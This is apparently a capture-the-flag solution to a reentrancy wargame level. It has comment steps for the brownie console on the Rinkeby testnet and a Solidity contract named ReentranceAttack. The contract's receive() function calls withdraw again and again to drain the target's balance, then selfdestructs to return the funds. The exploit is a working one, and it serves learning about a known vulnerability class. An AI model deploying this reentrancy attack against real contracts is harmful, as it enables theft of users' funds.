/*

re-entrancy is possible in the withdraw function , amount is sent then variables are set after sending ETH.

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# Deploy Attack Contract

# point Reentrance interface to Reentrance contract and call donate(address) with the Attack Contract address

r_contract = Interface.Reentrance('address')
r_contract.donate(AttackContractAddress,{'from': a[0], 'value': '.1 ether'})

# call attack() function

# check balance of your contract

# submit

# call destroy to get all eth back to your account

*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.6;


interface Reentrance {

function withdraw(uint _amount) external;
function donate(address _to) external payable;

}

contract ReentranceAttack {

    Reentrance reentrance_contract;

constructor(address _address)  {

    reentrance_contract = Reentrance(_address);
} 

function attack() external {
    //intiate attack by calling withdraw
    reentrance_contract.withdraw(0.01 ether);
    
    }

receive() external payable {
    // check balance of re-entrance contract before calling withdraw
    if (address(reentrance_contract).balance >0) reentrance_contract.withdraw(0.01 ether);

    }

function destroy() external {

    selfdestruct(payable(msg.sender));

    }

}

